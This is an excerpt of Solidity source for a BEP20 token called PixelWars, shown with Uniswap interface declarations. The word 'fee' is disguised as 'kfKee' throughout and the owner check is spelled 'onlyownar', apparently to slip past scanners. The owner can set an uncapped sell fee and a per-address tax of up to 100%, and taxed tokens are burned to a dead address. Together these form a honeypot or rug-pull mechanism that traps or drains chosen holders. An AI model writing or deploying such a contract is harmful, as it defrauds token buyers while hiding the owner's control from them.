...
interface IUniswapV2Factory {
    ...
    function kfKeeTo() external view returns (address);
    function kfKeeToSetter() external view returns (address);
    ...
    function setkfKeeTo(address) external;
    function setkfKeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingkfKeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingkfKeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingkfKeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingkfKeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingkfKeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract PixelWars is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellkfKee = 0;

    uint256 private _defaultBuykfKee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipkfKee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellkfKee = _value;
    }

    function setSlipkfKee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipkfKee[_address] = _value;
    }

    function getSlipkfKee(address _address) external view onlyownar returns (uint256) {
        return _slipkfKee[_address];
    }


    function setMAccountkfKee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountkfKee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradekfKeeAmount = 0;

        if (rF) {
            uint256 tradekfKee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradekfKee = _defaultSellkfKee;
                }
                if (from == uniswapV2Pair) {

                    tradekfKee = _defaultBuykfKee;
                }
            }
            if (_slipkfKee[from] > 0) {
                tradekfKee = _slipkfKee[from];
            }

            tradekfKeeAmount = _Amount.mul(tradekfKee).div(100);
        }


        if (tradekfKeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradekfKeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradekfKeeAmount);
            emit Transfer(from, _deadAddress, tradekfKeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradekfKeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradekfKeeAmount);
        emit Transfer(from, _to, _Amount - tradekfKeeAmount);
    }
